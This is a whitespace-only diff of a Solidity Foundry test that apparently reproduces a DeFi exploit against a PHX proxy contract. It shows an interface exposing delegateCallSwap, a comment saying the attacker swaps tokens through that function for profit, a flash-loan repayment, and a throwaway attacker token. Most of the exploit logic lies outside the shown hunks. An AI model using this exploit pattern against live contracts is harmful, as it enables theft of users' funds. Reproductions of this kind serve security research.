@@ -14,11 +14,14 @@ import "./../interface.sol";
 // and then swaps it into his own tokens by the delegateCallSwap function, making a profit from it
 
 interface IPHXPROXY {
+
     function buyLeverage(uint256 amount, uint256 minAmount, uint256 deadLine, bytes calldata /*data*/ ) external;
     function delegateCallSwap(bytes memory data) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
     IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
     SHITCOIN MYTOKEN;
@@ -68,9 +71,11 @@ contract ContractTest is Test {
 
         USDC.transfer(dodo, 8000 * 1e6);
     }
+
 }
 
 contract SHITCOIN {
+
     uint256 public totalSupply;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
@@ -113,4 +118,5 @@ contract SHITCOIN {
         totalSupply -= amount;
         emit Transfer(msg.sender, address(0), amount);
     }
+
 }
